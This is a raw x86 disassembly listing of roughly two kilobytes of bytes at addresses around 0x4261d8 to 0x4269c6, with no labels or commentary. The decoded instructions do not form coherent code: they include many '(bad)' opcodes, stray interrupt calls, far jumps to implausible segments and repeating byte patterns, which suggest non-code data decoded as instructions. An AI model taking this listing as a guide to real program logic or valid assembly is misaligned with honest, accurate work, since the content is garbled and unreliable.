  4261d8:	stos   BYTE PTR es:[edi],al
  4261d9:	clc    
  4261da:	add    BYTE PTR [eax],al
  4261dc:	or     dh,BYTE PTR [esi+0x1c]
  4261df:	int    0x76
  4261e1:	sbb    al,0xcd
  4261e3:	lea    esp,[edx+ecx*1]
  4261e6:	outs   dx,BYTE PTR ds:[esi]
  4261e7:	adc    al,0xcd
  4261e9:	jbe    0x42620f
  4261eb:	leave  
  4261ec:	add    BYTE PTR [edi-0x327f7f80],0x76
  4261f3:	lods   eax,DWORD PTR ds:[esi]
  4261f4:	int    0x8d
  4261f6:	and    al,0xa
  4261f8:	outs   dx,BYTE PTR ds:[esi]
  4261f9:	test   ch,cl
  4261fb:	jbe    0x42622d
  4261fd:	int    0x8d
  4261ff:	and    al,0xa
  426201:	outs   dx,BYTE PTR ds:[esi]
  426202:	mov    ch,cl
  426204:	jbe    0x42621a
  426206:	int    0x8d
  426208:	and    al,0xa
  42620a:	outs   dx,BYTE PTR ds:[esi]
  42620b:	dec    esp
  42620c:	int    0x76
  42620e:	and    al,0xc9
  426210:	ins    BYTE PTR es:[edi],dx
  426211:	and    al,0x81
  426213:	add    BYTE PTR [eax-0x32e11380],0x76
  42621a:	sbb    al,0xcd
  42621c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  426223:	or     ch,0xa
  426226:	and    eax,0xcd808081
  42622b:	xor    BYTE PTR [ebx],0x81
  42622e:	or     dh,BYTE PTR [esi-0x3]
  426231:	int    0x76
  426233:	std    
  426234:	stos   BYTE PTR es:[edi],al
  426235:	test   al,0x63
  426237:	retf   
  426238:	rcr    BYTE PTR [eax+eax*4],cl
  42623b:	xchg   esi,eax
  42623c:	int    0xed
  42623e:	int    0x76
  426240:	dec    esp
  426241:	adc    ch,ch
  426243:	cmp    eax,0x5b808081
  426248:	cwde   
  426249:	call   0x2f35:0x86214966
  426250:	push   es
  426251:	mov    ecx,0xcd80804a
  426256:	jbe    0x426288
  426258:	inc    cx
  42625a:	and    DWORD PTR [esi-0x62f9d0cb],eax
  426260:	dec    edx
  426261:	add    BYTE PTR [eax-0x29128937],0x37
  426268:	ficom  WORD PTR [ebx]
  42626a:	pop    ebp
  42626b:	mov    ebp,0xa25230a
  426270:	jbe    0x426283
  426272:	leave  
  426273:	jbe    0x42622a
  426275:	xchg   ecx,eax
  426276:	aaa    
  426277:	ficom  WORD PTR [ebx]
  426279:	or     dh,BYTE PTR [esi-0x43]
  42627c:	int    0x76
  42627e:	mov    BYTE PTR [edx],cl
  426280:	jbe    0x426277
  426282:	int    0x76
  426284:	cmc    
  426285:	int    0x1
  426287:	mov    ebp,0xcd808081
  42628c:	or     ch,0x80
  42628f:	or     dh,BYTE PTR [esi-0x7]
  426292:	pop    edi
  426293:	jle    0x4262ca
  426295:	add    BYTE PTR [eax-0x7fca69a3],0x80
  42629c:	mov    eax,0x4b0760a
  4262a1:	ins    DWORD PTR es:[edi],dx
  4262a2:	(bad)  
  4262a3:	mov    eax,0xcda2760a
  4262a8:	sar    DWORD PTR [eax+0x5d15760a],cl
  4262ae:	(bad)  
  4262af:	xor    eax,0xf1cd8080
  4262b4:	mov    eax,0xcf19960a
  4262b9:	nop
  4262ba:	xchg   edx,eax
  4262bb:	iret   
  4262bc:	sahf   
  4262bd:	(bad)  
  4262be:	int    0x99
  4262c0:	mov    eax,0xcd1d960a
  4262c5:	aad    0xb8
  4262c7:	or     dl,BYTE PTR [esi-0x662dfbdf]
  4262cd:	mov    eax,0xcf01960a
  4262d2:	jno    0x426328
  4262d4:	int    0x3
  4262d6:	mov    eax,0x40be60a
  4262db:	leave  
  4262dc:	xchg   ebp,eax
  4262dd:	mov    eax,0xcf05e60a
  4262e2:	ficomp WORD PTR [eax-0x48]
  4262e5:	or     ah,dh
  4262e7:	pop    es
  4262e8:	mov    eax,0xb809760a
  4262ed:	or     dl,dh
  4262ef:	retf   0xc5cd
  4262f2:	mov    eax,0xb8cc760a
  4262f7:	or     dl,BYTE PTR [edi]
  4262f9:	ins    BYTE PTR es:[edi],dx
  4262fa:	add    BYTE PTR [eax],al
  4262fc:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426303:	push   edx
  426304:	add    BYTE PTR [eax],al
  426306:	add    bh,cl
  426308:	outs   dx,BYTE PTR ds:[esi]
  426309:	add    edi,DWORD PTR [eax+0x74060a]
  42630f:	add    BYTE PTR [eax],al
  426311:	add    al,0x6d
  426313:	inc    edx
  426314:	mov    eax,0x78060a
  426319:	add    BYTE PTR [eax],al
  42631b:	iret   
  42631c:	outs   dx,BYTE PTR ds:[esi]
  42631d:	xor    BYTE PTR [eax+0x7c060a],bh
  426323:	add    BYTE PTR [eax],al
  426325:	add    al,0x6d
  426327:	xor    bh,BYTE PTR [eax+0x8a060a]
  42632d:	add    BYTE PTR [eax],al
  42632f:	mov    eax,0x8ccf0a
  426334:	add    BYTE PTR [eax],al
  426336:	int    0xc5
  426338:	mov    eax,0x8e060a
  42633d:	add    BYTE PTR [eax],al
  42633f:	int    0x76
  426341:	in     eax,dx
  426342:	int    0x8d
  426344:	adc    DWORD PTR [edi],ebp
  426346:	inc    ebp
  426347:	jge    0x4262db
  426349:	shr    ebx,cl
  42634b:	xchg   edx,eax
  42634c:	int    0x8d
  42634e:	in     eax,dx
  42634f:	int    0x96
  426351:	adc    ebx,eax
  426353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426354:	mov    esi,0xc93b4229
  426359:	cmp    ebx,edx
  42635b:	shl    edx,cl
  42635d:	sub    BYTE PTR [ebx-0x2e],dl
  426360:	in     al,dx
  426361:	outs   dx,BYTE PTR ds:[esi]
  426362:	iret   
  426363:	aam    0x76
  426365:	mov    al,0xb8
  426367:	int    0x4e
  426369:	das    
  42636a:	mov    ebx,0xcbbb2f18
  42636f:	cmp    ecx,DWORD PTR [edx+edx*1]
  426372:	sti    
  426373:	and    DWORD PTR ds:0xf3e38080,esi
  426379:	shl    edx,cl
  42637b:	das    
  42637c:	push   ebx
  42637d:	adc    ecx,DWORD PTR [ecx]
  42637f:	int3   
  426380:	test   DWORD PTR [ebp-0x32ffff01],esp
  426386:	lea    esi,[ebp+0x2fbd96cd]
  42638c:	inc    ebp
  42638d:	jecxz  0x426321
  42638f:	shl    ebx,cl
  426391:	xchg   edx,eax
  426392:	int    0x96
  426394:	mov    ch,0xcd
  426396:	(bad)  
  426397:	mov    ebp,0xf73bf03b
  42639c:	push   ebx
  42639d:	psrlq  mm5,mm2
  4263a0:	sub    BYTE PTR [edi-0x7906fb2d],al
  4263a6:	(bad)  
  4263a7:	popa   
  4263a8:	int    0x76
  4263aa:	in     eax,dx
  4263ab:	int    0x8d
  4263ad:	adc    DWORD PTR [edi],ebp
  4263af:	inc    ebp
  4263b0:	jge    0x426344
  4263b2:	shr    ebx,cl
  4263b4:	xchg   edx,eax
  4263b5:	int    0x8d
  4263b7:	in     eax,dx
  4263b8:	int    0x96
  4263ba:	adc    DWORD PTR [ebx],edi
  4263bc:	leave  
  4263bd:	cmp    ebx,edx
  4263bf:	shl    edx,cl
  4263c1:	sub    BYTE PTR [ebx-0x2e],dl
  4263c4:	in     al,dx
  4263c5:	outs   dx,BYTE PTR ds:[esi]
  4263c6:	iret   
  4263c7:	aam    0x76
  4263c9:	add    DWORD PTR [eax-0x44d0b133],edi
  4263cf:	sbb    BYTE PTR [edi],ch
  4263d1:	mov    ebx,0x120c3bcb
  4263d6:	sti    
  4263d7:	and    DWORD PTR ds:0xf3e38080,esi
  4263dd:	shl    edx,cl
  4263df:	das    
  4263e0:	push   ebx
  4263e1:	adc    ecx,DWORD PTR [ecx]
  4263e3:	int3   
  4263e4:	test   esp,ecx
  4263e6:	inc    DWORD PTR [eax]
  4263e8:	add    ch,cl
  4263ea:	lea    esi,[ebp+0x2fbd96cd]
  4263f0:	inc    ebp
  4263f1:	jecxz  0x426385
  4263f3:	shl    ebx,cl
  4263f5:	xchg   edx,eax
  4263f6:	int    0x96
  4263f8:	mov    ch,0xcd
  4263fa:	(bad)  
  4263fb:	mov    ebp,0xf73bf03b
  426400:	push   ebx
  426401:	psrlq  mm5,mm2
  426404:	sub    BYTE PTR [edi-0x7406fb2d],al
  42640a:	(bad)  
  42640b:	popa   
  42640c:	int    0x76
  42640e:	in     eax,dx
  42640f:	int    0x8d
  426411:	adc    DWORD PTR [edi],ebp
  426413:	inc    ebp
  426414:	jge    0x4263a8
  426416:	shr    ebx,cl
  426418:	xchg   edx,eax
  426419:	int    0x8d
  42641b:	in     eax,dx
  42641c:	int    0x96
  42641e:	adc    DWORD PTR [ebx],edi
  426420:	leave  
  426421:	cmp    ebx,edx
  426423:	shl    edx,cl
  426425:	sub    BYTE PTR [ebx-0x2e],dl
  426428:	in     al,dx
  426429:	je     0x4263fa
  42642b:	push   ebp
  42642c:	jbe    0x42649a
  42642e:	add    BYTE PTR [eax],al
  426430:	add    BYTE PTR [eax-0x44d0b133],bh
  426436:	sbb    BYTE PTR [edi],ch
  426438:	mov    ebx,0x120c3bcb
  42643d:	sti    
  42643e:	and    DWORD PTR ds:0xf3e38080,esi
  426444:	shl    edx,cl
  426446:	das    
  426447:	push   ebx
  426448:	adc    ecx,DWORD PTR [ecx]
  42644a:	int3   
  42644b:	test   DWORD PTR ds:0xcd0000ff,eax
  426451:	lea    esi,[ebp+0x2fbd96cd]
  426457:	inc    ebp
  426458:	jecxz  0x4263ec
  42645a:	shl    ebx,cl
  42645c:	xchg   edx,eax
  42645d:	int    0x96
  42645f:	mov    ch,0xcd
  426461:	(bad)  
  426462:	mov    ebp,0xf73bf03b
  426467:	push   ebx
  426468:	psrlq  mm5,mm2
  42646b:	sub    BYTE PTR [edi-0x7706fb2d],al
  426471:	(bad)  
  426472:	mov    ebx,0xffb506cf
  426477:	add    BYTE PTR [eax],al
  426479:	or     dh,BYTE PTR [esi-0x7]
  42647c:	int    0x76
  42647e:	stc    
  42647f:	pop    edi
  426480:	inc    esi
  426481:	pop    esp
  426482:	inc    ebp
  426483:	xchg   edi,eax
  426484:	or     cl,BYTE PTR [eax+0x79245161]
  42648a:	daa    
  42648b:	or     dh,BYTE PTR [eax-0x7c]
  42648e:	int    0x6
  426490:	mov    ch,0xff
  426492:	add    BYTE PTR [eax],al
  426494:	int    0x57
  426496:	mov    ebp,0xa0000ff
  42649b:	(bad)  
  42649c:	mov    ebp,0x8621d169
  4264a1:	xor    eax,0x62fd343
  4264a6:	pusha  
  4264a7:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  4264b1:	add    BYTE PTR [eax-0x7fca76a3],0x80
  4264b8:	mov    eax,0xfff9060a
  4264bd:	add    BYTE PTR [eax],al
  4264bf:	int    0xc5
  4264c1:	mov    eax,0xff03060a
  4264c6:	add    BYTE PTR [eax],al
  4264c8:	pop    ebp
  4264c9:	es xor eax,0xab88080
  4264cf:	push   es
  4264d0:	std    
  4264d1:	inc    DWORD PTR [eax]
  4264d3:	add    BYTE PTR [ebp-0x5d],bl
  4264d6:	xor    eax,0xab88080
  4264db:	push   es
  4264dc:	(bad)  
  4264dd:	inc    DWORD PTR [eax]
  4264df:	add    BYTE PTR [ebp+0x1e],bl
  4264e2:	xor    eax,0xab88080
  4264e7:	push   es
  4264e8:	add    BYTE PTR [eax],0x0
  4264eb:	add    BYTE PTR [ebp*2-0x47823218],al
  4264f2:	or     cl,bh
  4264f4:	xchg   edx,eax
  4264f5:	add    BYTE PTR [eax],al
  4264f7:	add    ch,cl
  4264f9:	jbe    0x42652b
  4264fb:	pop    edi
  4264fc:	dec    ebx
  4264fd:	xor    eax,0xab88080
  426502:	iret   
  426503:	test   BYTE PTR [eax],al
  426505:	add    BYTE PTR [eax],al
  426507:	add    al,0xd3
  426509:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42650f:	add    BYTE PTR [eax],al
  426511:	pop    edi
  426512:	push   esi
  426513:	xor    eax,0xab88080
  426518:	iret   
  426519:	mov    BYTE PTR [eax],al
  42651b:	add    BYTE PTR [eax],al
  42651d:	add    al,0xd3
  42651f:	pushf  
  426520:	mov    eax,0x4acf0a
  426525:	add    BYTE PTR [eax],al
  426527:	int    0xc
  426529:	mov    eax,0x4ccf0a
  42652e:	add    BYTE PTR [eax],al
  426530:	pop    edi
  426531:	add    al,0x35
  426533:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  42653a:	add    BYTE PTR [eax],al
  42653c:	cmp    edi,DWORD PTR [ecx+0x5f]
  42653f:	adc    DWORD PTR [eax-0x80],edx
  426542:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  426549:	add    bl,dl
  42654b:	mov    ebp,0x151a5f92
  426550:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  426557:	add    BYTE PTR [eax],al
  426559:	pop    edi
  42655a:	call   0xcf0a:0xb88080eb
  426561:	adc    al,0x0
  426563:	add    BYTE PTR [eax],al
  426565:	int    0x8d
  426567:	xor    BYTE PTR [edx+eax*1],al
  42656a:	call   ebx
  42656c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426570:	or     al,BYTE PTR [esi]
  426572:	adc    eax,0xcd0000ff
  426577:	jbe    0x4265c5
  426579:	int    0x8d
  42657b:	dec    esp
  42657c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42657f:	mov    ebp,0xff020492
  426584:	shl    edx,cl
  426586:	sub    BYTE PTR [ebx-0x2d],dl
  426589:	leave  
  42658a:	add    eax,0xff1d06
  42658f:	add    BYTE PTR [eax],al
  426591:	add    BYTE PTR [eax+0x1506cf80],al
  426597:	inc    DWORD PTR [eax]
  426599:	add    BYTE PTR [eax-0x33],dh
  42659c:	jbe    0x4265ce
  42659e:	int    0x8d
  4265a0:	xor    BYTE PTR [ebx],bh
  4265a2:	jns    0x426577
  4265a4:	mov    ebp,0xff020492
  4265a9:	shl    edx,cl
  4265ab:	sub    BYTE PTR [ebx-0x2d],dl
  4265ae:	jo     0x42657f
  4265b0:	push   es
  4265b1:	stc    
  4265b2:	inc    DWORD PTR [eax]
  4265b4:	add    BYTE PTR [eax-0x33],dh
  4265b7:	jbe    0x4265ae
  4265b9:	int    0x1
  4265bb:	cmp    eax,0xc9808081
  4265c0:	push   es
  4265c1:	sbb    BYTE PTR [eax],al
  4265c3:	add    BYTE PTR [eax],al
  4265c5:	inc    eax
  4265c6:	retf   
  4265c7:	fwait
  4265c8:	xor    eax,0x76cd5000
  4265cd:	adc    al,0x0
  4265cf:	icebp  
  4265d0:	or     dh,BYTE PTR [esi-0x7]
  4265d3:	int    0x76
  4265d5:	stc    
  4265d6:	push   es
  4265d7:	ins    DWORD PTR es:[edi],dx
  4265d8:	aam    0x4a
  4265da:	adc    dl,BYTE PTR [esi+0x68]
  4265dd:	or     BYTE PTR [ebx+ecx*1],bl
  4265e0:	fmul   QWORD PTR [ebx-0x17]
  4265e3:	(bad)  
  4265e4:	int    0x8d
  4265e6:	dec    esp
  4265e7:	int    0x96
  4265e9:	dec    esp
  4265ea:	sar    bh,0x3b
  4265ed:	setl   BYTE PTR [ebx]
  4265f0:	icebp  
  4265f1:	shr    edx,cl
  4265f3:	sub    bl,dl
  4265f5:	jmp    0x426589
  4265f7:	push   ebx
  4265f8:	adc    ecx,ebp
  4265fa:	xchg   esi,eax
  4265fb:	cmc    
  4265fc:	int    0xa2
  4265fe:	and    eax,0x5e808081
  426603:	dec    edx
  426604:	das    
  426605:	push   es
  426606:	popa   
  426607:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42660d:	int    0x96
  42660f:	dec    esp
  426610:	cmp    ecx,DWORD PTR [edi]
  426612:	shr    ebx,cl
  426614:	xchg   edx,eax
  426615:	cmp    esi,ecx
  426617:	shr    edx,cl
  426619:	sub    BYTE PTR [ebx+0x13],dl
  42661c:	int    0x96
  42661e:	cmc    
  42661f:	int    0xa2
  426621:	in     al,0x81
  426623:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  42662a:	int    0x96
  42662c:	dec    esp
  42662d:	cmp    ecx,DWORD PTR [edi]
  42662f:	shr    ebx,cl
  426631:	xchg   edx,eax
  426632:	cmp    esi,ecx
  426634:	shr    edx,cl
  426636:	sub    BYTE PTR [ebx+0x13],dl
  426639:	int    0x96
  42663b:	cmc    
  42663c:	int    0xa2
  42663e:	add    DWORD PTR [ecx+0x4a0a8080],eax
  426644:	pop    edi
  426645:	xor    ax,0x8080
  426649:	mov    eax,0x24cf0a
  42664e:	add    BYTE PTR [eax],al
  426650:	int    0xc
  426652:	mov    eax,0x28cf0a
  426657:	add    BYTE PTR [eax],al
  426659:	pop    edi
  42665a:	es xor eax,0xab88080
  426660:	iret   
  426661:	sub    al,0x0
  426663:	add    BYTE PTR [eax],al
  426665:	pop    edi
  426666:	daa    
  426667:	xor    eax,0xab88080
  42666c:	iret   
  42666d:	xor    al,BYTE PTR [eax]
  42666f:	add    BYTE PTR [eax],al
  426671:	add    al,0xd3
  426673:	test   eax,0x34cf0ab8
  426678:	add    BYTE PTR [eax],al
  42667a:	add    BYTE PTR [edi-0x69],bl
  42667d:	xor    eax,0xab88080
  426682:	iret   
  426683:	cmp    BYTE PTR [eax],al
  426685:	add    BYTE PTR [eax],al
  426687:	add    al,0xd3
  426689:	mov    dl,0xb8
  42668b:	or     cl,bh
  42668d:	cmp    al,0x0
  42668f:	add    BYTE PTR [eax],al
  426691:	pop    edi
  426692:	fwait
  426693:	xor    eax,0xab88080
  426698:	iret   
  426699:	inc    eax
  42669a:	add    BYTE PTR [eax],al
  42669c:	add    ch,cl
  42669e:	or     al,0xb8
  4266a0:	or     cl,bh
  4266a2:	inc    esp
  4266a3:	add    BYTE PTR [eax],al
  4266a5:	add    BYTE PTR [edi+0x17],bl
  4266a8:	xor    eax,0xab88080
  4266ad:	iret   
  4266ae:	dec    eax
  4266af:	add    BYTE PTR [eax],al
  4266b1:	add    BYTE PTR [edi+0x26],bl
  4266b4:	pop    esi
  4266b5:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  4266bc:	add    BYTE PTR [eax],al
  4266be:	pop    edi
  4266bf:	cmp    esi,DWORD PTR [edx]
  4266c1:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  4266c8:	add    BYTE PTR [eax],al
  4266ca:	jns    0x426742
  4266cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266ce:	pop    edi
  4266cf:	pop    esp
  4266d0:	adc    eax,0xab88080
  4266d5:	iret   
  4266d6:	push   esp
  4266d7:	add    BYTE PTR [eax],al
  4266d9:	add    BYTE PTR [ebx+edx*8],al
  4266dc:	pop    esp
  4266dd:	mov    eax,0x58cf0a
  4266e2:	add    BYTE PTR [eax],al
  4266e4:	jns    0x42675c
  4266e6:	fisttp WORD PTR [ecx+0x79]
  4266e9:	jbe    0x426694
  4266eb:	inc    ecx
  4266ec:	jns    0x426764
  4266ee:	loope  0x426693
  4266f0:	pop    edi
  4266f1:	fcom   st(4)
  4266f3:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  4266fa:	add    BYTE PTR [eax],al
  4266fc:	jns    0x426774
  4266fe:	lods   eax,DWORD PTR ds:[esi]
  4266ff:	push   edi
  426700:	pop    edi
  426701:	jnp    0x426758
  426703:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42670a:	add    BYTE PTR [eax],al
  42670c:	jns    0x426784
  42670e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426712:	jmp    0x8080:0x35a15f47
  426719:	mov    eax,0x64cf0a
  42671e:	add    BYTE PTR [eax],al
  426720:	jns    0x426798
  426722:	in     eax,0x18
  426724:	int    0x8d
  426726:	xor    ch,cl
  426728:	xchg   esi,eax
  426729:	xor    BYTE PTR [ebx],bh
  42672b:	(bad)  
  42672d:	icebp  
  42672e:	shr    ebx,cl
  426730:	xchg   edx,eax
  426731:	shr    edx,cl
  426733:	sub    BYTE PTR [ebx+0x13],dl
  426736:	in     al,dx
  426737:	xchg   esp,eax
  426738:	int    0x96
  42673a:	xor    ch,cl
  42673c:	out    0x30,al
  42673e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426744:	stc    
  426745:	shr    ecx,cl
  426747:	sub    BYTE PTR [ebx-0x27],dl
  42674a:	xor    edx,DWORD PTR [ebx]
  42674c:	das    
  42674d:	pop    ecx
  42674e:	mov    WORD PTR [ebp-0x5b],cs
  426751:	int    0x96
  426753:	xor    ch,cl
  426755:	out    0x30,al
  426757:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42675d:	stc    
  42675e:	shr    ecx,cl
  426760:	sub    BYTE PTR [ebx-0x27],dl
  426763:	int    0xe6
  426765:	stc    
  426766:	add    al,0x2
  426768:	adc    DWORD PTR [edx],0xffffffd3
  42676b:	fwait
  42676c:	add    BYTE PTR [eax+0x9033380],0x8c
  426773:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  426775:	int    0x96
  426777:	xor    ch,cl
  426779:	lea    esi,[eax]
  42677b:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  426781:	sub    bl,dl
  426783:	repz xchg edx,eax
  426785:	push   ebx
  426786:	jecxz  0x426755
  426788:	(bad)  
  426789:	stc    
  42678a:	xchg   DWORD PTR [ebx],edx
  42678c:	int    0x96
  42678e:	xor    ch,cl
  426790:	out    0x30,al
  426792:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  426798:	xchg   edx,eax
  426799:	shr    ecx,cl
  42679b:	sub    BYTE PTR [ebx-0x27],dl
  42679e:	add    al,0xd2
  4267a0:	mov    BYTE PTR [edx],cl
  4267a2:	(bad)  
  4267a3:	stc    
  4267a4:	inc    ebx
  4267a5:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  4267ab:	int    0x96
  4267ad:	xor    BYTE PTR [ebx],bh
  4267af:	(bad)  
  4267b1:	icebp  
  4267b2:	shr    ebx,cl
  4267b4:	xchg   edx,eax
  4267b5:	shr    edx,cl
  4267b7:	sub    BYTE PTR [ebx+0x13],dl
  4267ba:	or     cl,bh
  4267bc:	adc    eax,0xcd0000ff
  4267c1:	lea    ecx,[ebp+ecx*8-0x6a]
  4267c5:	dec    esp
  4267c6:	cmp    ecx,DWORD PTR [edi]
  4267c8:	cmp    esi,ecx
  4267ca:	shr    edx,cl
  4267cc:	sub    bl,dl
  4267ce:	jmp    0x426762
  4267d0:	push   ebx
  4267d1:	adc    ecx,edi
  4267d3:	xchg   esi,eax
  4267d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	or     dl,BYTE PTR ds:0xff1dcf
  4267db:	add    BYTE PTR [ecx+0x6b],ah
  4267de:	xor    eax,0x13cd8080
  4267e3:	mov    eax,0x4258d0a
  4267e8:	rcl    edx,cl
  4267ea:	int    0xfa
  4267ec:	mov    eax,0xcf29e60a
  4267f1:	loopne 0x42679c
  4267f3:	mov    eax,0x42de60a
  4267f8:	leave  
  4267f9:	test   BYTE PTR [eax-0x304d19f6],bh
  4267ff:	loopne 0x426815
  426801:	mov    eax,0x435e60a
  426806:	leave  
  426807:	loop   0x4267c1
  426809:	or     ah,dh
  42680b:	cmp    ebp,ecx
  42680d:	cli    
  42680e:	mov    eax,0xcd3de60a
  426813:	add    edi,DWORD PTR [eax-0x32be19f6]
  426819:	cld    
  42681a:	mov    eax,0xcd45e60a
  42681f:	add    edi,DWORD PTR [eax-0x322f19f6]
  426825:	cli    
  426826:	mov    eax,0xcfc2e60a
  42682b:	loopne 0x426856
  42682d:	mov    eax,0x455e60a
  426832:	leave  
  426833:	test   BYTE PTR [eax-0x30a619f6],bh
  426839:	loopne 0x4267d0
  42683b:	mov    eax,0x45de60a
  426840:	leave  
  426841:	loop   0x4267fb
  426843:	or     ah,dh
  426845:	popa   
  426846:	mov    eax,0xb8658d0a
  42684b:	or     dl,BYTE PTR [esi-0x47f33297]
  426851:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  426857:	int    0x96
  426859:	dec    esp
  42685a:	cmp    esi,ecx
  42685c:	cmp    ecx,DWORD PTR [edi]
  42685e:	shr    edx,cl
  426860:	sub    bl,dl
  426862:	jmp    0x4267f6
  426864:	push   ebx
  426865:	adc    ecx,ebp
  426867:	xchg   esi,eax
  426868:	dec    esp
  426869:	int    0xe6
  42686b:	dec    esp
  42686c:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  426872:	mov    WORD PTR [ebp-0x2c06c430],cs
  426878:	jmp    0x301bbba5
  42687d:	mov    ebx,0xb8d93b5e
  426882:	or     dh,BYTE PTR [ecx]
  426884:	int    0x8d
  426886:	dec    esp
  426887:	int    0x96
  426889:	dec    esp
  42688a:	cmp    ecx,DWORD PTR [edi]
  42688c:	cmp    esi,ecx
  42688e:	shr    ebx,cl
  426890:	xchg   edx,eax
  426891:	shr    edx,cl
  426893:	sub    BYTE PTR [ebx+0x13],dl
  426896:	int    0x96
  426898:	dec    esp
  426899:	iret   
  42689a:	mov    WORD PTR [ebp-0x3266c4db],cs
  4268a0:	out    0x4c,al
  4268a2:	shl    ebx,cl
  4268a4:	xchg   edx,eax
  4268a5:	cmp    edi,ecx
  4268a7:	shr    ecx,cl
  4268a9:	sub    BYTE PTR [ebx-0x27],dl
  4268ac:	das    
  4268ad:	mov    ebx,0xb8d93b5e
  4268b2:	or     dh,BYTE PTR [ecx]
  4268b4:	int    0x8d
  4268b6:	dec    esp
  4268b7:	int    0x96
  4268b9:	dec    esp
  4268ba:	cmp    esi,ecx
  4268bc:	shr    edx,cl
  4268be:	sub    BYTE PTR [ebx],bh
  4268c0:	psrlq  mm5,mm3
  4268c3:	xchg   edx,eax
  4268c4:	push   ebx
  4268c5:	adc    ecx,ebp
  4268c7:	xchg   esi,eax
  4268c8:	dec    esp
  4268c9:	int    0xe6
  4268cb:	dec    esp
  4268cc:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4268d2:	stc    
  4268d3:	shr    ecx,cl
  4268d5:	sub    BYTE PTR [ebx-0x27],dl
  4268d8:	mov    eax,0x9096cc0a
  4268dd:	inc    DWORD PTR [eax]
  4268df:	add    ch,cl
  4268e1:	lea    ecx,[ebp+ecx*8-0x6a]
  4268e5:	dec    esp
  4268e6:	cmp    esi,ecx
  4268e8:	shr    edx,cl
  4268ea:	sub    BYTE PTR [ebx],bh
  4268ec:	psrlq  mm5,mm3
  4268ef:	xchg   edx,eax
  4268f0:	push   ebx
  4268f1:	adc    ecx,ebp
  4268f3:	xchg   esi,eax
  4268f4:	dec    esp
  4268f5:	int    0xe6
  4268f7:	dec    esp
  4268f8:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4268fe:	stc    
  4268ff:	shr    ecx,cl
  426901:	sub    BYTE PTR [ebx-0x27],dl
  426904:	mov    eax,0xa496cc0a
  426909:	inc    DWORD PTR [eax]
  42690b:	add    ch,cl
  42690d:	lea    esi,[eax]
  42690f:	int    0x96
  426911:	xor    BYTE PTR [ebx],bh
  426913:	icebp  
  426914:	cmp    ecx,DWORD PTR [edi]
  426916:	shr    edx,cl
  426918:	sub    bl,dl
  42691a:	jmp    0x4268ae
  42691c:	push   ebx
  42691d:	adc    ecx,ebp
  42691f:	xchg   esi,eax
  426920:	xor    ch,cl
  426922:	out    0x30,al
  426924:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  42692a:	xchg   edx,eax
  42692b:	shr    ecx,cl
  42692d:	sub    BYTE PTR [ebx-0x27],dl
  426930:	xchg   DWORD PTR [ebx],edx
  426932:	or     cl,bh
  426934:	adc    eax,0xcd0000ff
  426939:	lea    ecx,[ebp+ecx*8-0x6a]
  42693d:	dec    esp
  42693e:	int    0xe6
  426940:	mov    BYTE PTR [ebx],bh
  426942:	icebp  
  426943:	cmp    ecx,DWORD PTR [edi]
  426945:	shr    ebx,cl
  426947:	xchg   edx,eax
  426948:	shr    edx,cl
  42694a:	sub    BYTE PTR [ebx+0x13],dl
  42694d:	iret   
  42694e:	push   es
  42694f:	nop
  426950:	inc    DWORD PTR [eax]
  426952:	add    BYTE PTR [edx],cl
  426954:	add    eax,0xff1dcf
  426959:	add    bh,cl
  42695b:	jbe    0x42692d
  42695d:	mov    ebp,0x10d8
  426962:	int    0x8d
  426964:	xor    ch,cl
  426966:	xchg   esi,eax
  426967:	xor    al,al
  426969:	(bad)  
  42696a:	cmp    ecx,DWORD PTR [edi]
  42696c:	stos   BYTE PTR es:[edi],al
  42696d:	cmp    ebx,ecx
  42696f:	shr    ebx,cl
  426971:	xchg   edx,eax
  426972:	shr    edx,cl
  426974:	sub    BYTE PTR [ebx+0x13],dl
  426977:	or     al,BYTE PTR ds:0xff1dcf
  42697d:	add    ch,cl
  42697f:	jbe    0x4269cd
  426981:	int    0x8d
  426983:	dec    esp
  426984:	cmp    edi,DWORD PTR [ecx-0x2d]
  426987:	mov    ebp,0xd3f03b92
  42698c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426990:	aam    0x3c
  426992:	iret   
  426993:	push   es
  426994:	adc    eax,0x700000ff
  426999:	int    0x76
  42699b:	xor    ch,cl
  42699d:	lea    esi,[eax]
  42699f:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269a2:	mov    ebp,0xd3f03b92
  4269a7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269ab:	jo     0x42697c
  4269ad:	push   es
  4269ae:	and    al,0x0
  4269b0:	add    BYTE PTR [eax],al
  4269b2:	jo     0x426981
  4269b4:	jbe    0x4269ca
  4269b6:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  4269bd:	int    0x8d
  4269bf:	dec    esp
  4269c0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4269c3:	lock int 0xe6
  4269c6:	mov    bl,dl
